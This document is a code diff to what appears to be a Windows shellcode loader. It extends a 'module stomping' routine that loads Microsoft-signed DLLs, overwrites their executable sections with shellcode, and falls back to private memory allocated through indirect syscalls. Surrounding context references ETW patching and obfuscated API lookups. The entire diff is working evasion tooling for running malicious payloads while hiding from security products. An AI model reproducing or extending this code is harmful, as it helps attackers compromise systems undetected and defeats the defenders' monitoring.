@@ -376,54 +376,92 @@ static void patch_etw(PVOID ntdll) {
 // ============================================================
 //  Module Stomping — load a legit signed DLL, overwrite .text
 // ============================================================
+
+// Try loading a DLL whose .text is large enough for the shellcode
+static HMODULE try_load_dll(fnLdrLoadDll LdrLoadDll, WCHAR *name) {
+    UNICODE_STRING us;
+    us.Buffer        = name;
+    us.Length         = (USHORT)(wcslen(name) * sizeof(WCHAR));
+    us.MaximumLength  = us.Length + sizeof(WCHAR);
+    HMODULE h = NULL;
+    if (LdrLoadDll(NULL, 0, &us, &h) == 0 && h) return h;
+    return NULL;
+}
+
 static PVOID stomp(PVOID ntdll, unsigned char *sc, size_t sc_len) {
     char sLdr[] = {'L','d','r','L','o','a','d','D','l','l',0};
     fnLdrLoadDll LdrLoadDll =
         (fnLdrLoadDll)pe_proc(ntdll, djb2_a(sLdr));
     if (!LdrLoadDll) { printf("[-] LdrLoadDll missing\n"); return NULL; }
 
-    // Target DLL — any signed, unused-by-host dll with a .text big enough
-    WCHAR target[] = {'x','p','s','s','v','c','s','.','d','l','l',0};
-    UNICODE_STRING us;
-    us.Buffer        = target;
-    us.Length        = (USHORT)(wcslen(target) * sizeof(WCHAR));
-    us.MaximumLength = us.Length + sizeof(WCHAR);
+    // Candidate DLLs sorted large → small .text sections
+    // All are Microsoft-signed and rarely used by host processes
+    WCHAR *candidates[] = {
+        (WCHAR[]){'m','s','h','t','m','l','.','d','l','l',0},            // ~5 MB
+        (WCHAR[]){'d','3','d','1','1','.','d','l','l',0},                // ~2 MB
+        (WCHAR[]){'u','r','l','m','o','n','.','d','l','l',0},            // ~1.5 MB
+        (WCHAR[]){'d','b','g','h','e','l','p','.','d','l','l',0},        // ~1.6 MB
+        (WCHAR[]){'w','i','n','i','n','e','t','.','d','l','l',0},        // ~1 MB
+        (WCHAR[]){'x','p','s','s','v','c','s','.','d','l','l',0},
+        (WCHAR[]){'a','m','s','i','.','d','l','l',0},
+        NULL
+    };
 
     HMODULE h = NULL;
-    NTSTATUS st = LdrLoadDll(NULL, 0, &us, &h);
-    if (st != 0 || !h) {
-        // Fallback: amsi.dll (always signed, tiny)
-        WCHAR fb[] = {'a','m','s','i','.','d','l','l',0};
-        us.Buffer = fb;
-        us.Length = (USHORT)(wcslen(fb) * sizeof(WCHAR));
-        us.MaximumLength = us.Length + sizeof(WCHAR);
-        st = LdrLoadDll(NULL, 0, &us, &h);
-        if (st != 0 || !h) {
-            printf("[-] LdrLoadDll failed: 0x%08X\n", (unsigned)st);
-            return NULL;
-        }
-    }
-    printf("[+] Stomp host loaded @ %p\n", (PVOID)h);
-
-    // Find a suitable executable section
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
-    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
-    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
-
     PVOID text = NULL;
     DWORD text_size = 0;
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
-            sec[i].Misc.VirtualSize >= sc_len) {
-            text = (BYTE*)h + sec[i].VirtualAddress;
-            text_size = sec[i].Misc.VirtualSize;
+
+    for (int c = 0; candidates[c]; c++) {
+        h = try_load_dll(LdrLoadDll, candidates[c]);
+        if (!h) continue;
+
+        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
+        PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
+        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+
+        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+            if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                sec[i].Misc.VirtualSize >= sc_len) {
+                text = (BYTE*)h + sec[i].VirtualAddress;
+                text_size = sec[i].Misc.VirtualSize;
+                break;
+            }
+        }
+        if (text) {
+            printf("[+] Stomp host loaded @ %p\n", (PVOID)h);
             break;
         }
     }
+
+    // Fallback: if no DLL .text is large enough, use VirtualAlloc via
+    // our indirect syscalls.  Less stealthy (private commit) but works.
     if (!text) {
-        printf("[-] No .text section large enough (%zu bytes needed)\n", sc_len);
-        return NULL;
+        printf("[!] No DLL .text large enough — falling back to alloc\n");
+        fnNtAllocateVirtualMemory NtAlloc =
+            (fnNtAllocateVirtualMemory)g_sc[SC_ALLOC].stub;
+        fnNtProtectVirtualMemory NtProt =
+            (fnNtProtectVirtualMemory)g_sc[SC_PROTECT].stub;
+
+        PVOID mem = NULL;
+        SIZE_T sz = sc_len;
+        NTSTATUS st = NtAlloc((HANDLE)-1, &mem, 0, &sz,
+                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (st != 0 || !mem) {
+            printf("[-] NtAlloc fallback: 0x%08X\n", (unsigned)st);
+            return NULL;
+        }
+        memcpy(mem, sc, sc_len);
+
+        PVOID addr = mem; SIZE_T ps = sc_len; ULONG old;
+        st = NtProt((HANDLE)-1, &addr, &ps, PAGE_EXECUTE_READ, &old);
+        if (st != 0) {
+            printf("[-] NtProtect fallback: 0x%08X\n", (unsigned)st);
+            return NULL;
+        }
+        printf("[+] Shellcode in private memory @ %p (indirect syscall)\n", mem);
+        return mem;
     }
+
     printf("[+] .text @ %p  (%u bytes)\n", text, (unsigned)text_size);
 
     // Flip .text to RW via indirect syscall
@@ -433,7 +471,7 @@ static PVOID stomp(PVOID ntdll, unsigned char *sc, size_t sc_len) {
     PVOID addr = text;
     SIZE_T size = sc_len;
     ULONG old;
-    st = NtProt((HANDLE)-1, &addr, &size, PAGE_READWRITE, &old);
+    NTSTATUS st = NtProt((HANDLE)-1, &addr, &size, PAGE_READWRITE, &old);
     if (st != 0) { printf("[-] NtProtect RW: 0x%08X\n", (unsigned)st); return NULL; }
 
     memcpy(text, sc, sc_len);
